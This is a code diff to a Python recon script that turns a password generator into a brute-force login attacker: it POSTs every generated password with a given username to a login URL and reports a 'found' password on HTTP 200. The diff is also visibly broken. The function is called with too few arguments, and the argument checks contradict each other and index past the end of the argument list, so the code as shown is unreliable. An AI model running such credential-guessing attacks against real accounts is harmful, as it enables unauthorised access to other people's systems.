@@ -97,7 +97,7 @@ def extractSubdomains(line, output, links):
             print("Waiting")
             time.sleep(5)
 
-def generatePasswords(length):
+def bruteForce(length, link, username):
 
     characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
 
@@ -107,7 +107,16 @@ def generatePasswords(length):
 
     for s in strings:
 
-        print(s)
+        payload = {'username': username, 'password': s}
+
+        response = requests.post(link, data=payload)
+
+        if response.status_code == 200:
+            
+            print("Password found: ", s)
+            return    
+            
+    print("Login failed.")
 
 
 def cleanUrls(master):
@@ -174,9 +183,15 @@ if(len(sys.argv) >= 2):
                                     
                                     extractSubdomains(line, domains_output, links_output)                        
 
-                    if len(sys.argv) == 2 or sys.argv[2] == '-b':
+                    if len(sys.argv) == 2 and sys.argv[2] == '-b':
                                     
-                        generatePasswords(5)                        
+                        if len(sys.argv) == 3:
+                            
+                            bruteForce(5, sys.argv[3])                        
+
+                        else:
+
+                            print("Missing Username")
 
     else:
 
